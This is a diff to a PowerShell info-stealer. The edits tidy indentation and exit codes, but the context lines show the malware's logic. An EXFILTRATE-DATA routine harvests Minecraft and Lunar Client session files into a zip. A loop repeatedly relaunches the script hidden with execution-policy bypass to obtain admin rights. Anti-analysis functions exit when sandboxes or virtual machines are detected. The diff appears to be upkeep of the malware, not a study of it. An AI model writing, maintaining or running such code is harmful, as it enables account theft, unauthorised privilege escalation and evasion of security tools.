@@ -151,7 +151,7 @@ function EXFILTRATE-DATA {
             $minecraft_session = "$env:localappdata\temp\minecraft-session"
             New-Item -ItemType Directory -Force -Path $minecraft_session
             $minecraftfolder1 = $env:appdata + "\.minecraft"
-    		$minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
+            $minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
             Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
             Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
             $minecraft_zip = "$env:localappdata\temp\minecraft-session.zip"
@@ -490,7 +490,7 @@ function Request-Admin {
     while(!(CHECK_IF_ADMIN)) {
         try {
             Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs
-            exit
+            exit 0
         }
         catch {}
     }
@@ -522,12 +522,12 @@ function Invoke-ANTITOTAL {
             
             if ($output -eq $true) {
                 Write-Host "Closing the app..."
-                Exit
+                Exit 1
             }
         }
         else {
             Write-Host "Failed to retrieve content from URL: $url"
-            Exit
+            Exit 1
         }
     }
     Invoke-ANTIVM
@@ -634,7 +634,7 @@ function Invoke-ANTIVM {
     }
     else { 
         Write-Output "Detected processes: $($detectedProcesses -join ', ')"
-        Exit
+        Exit 1
     }
 }
 
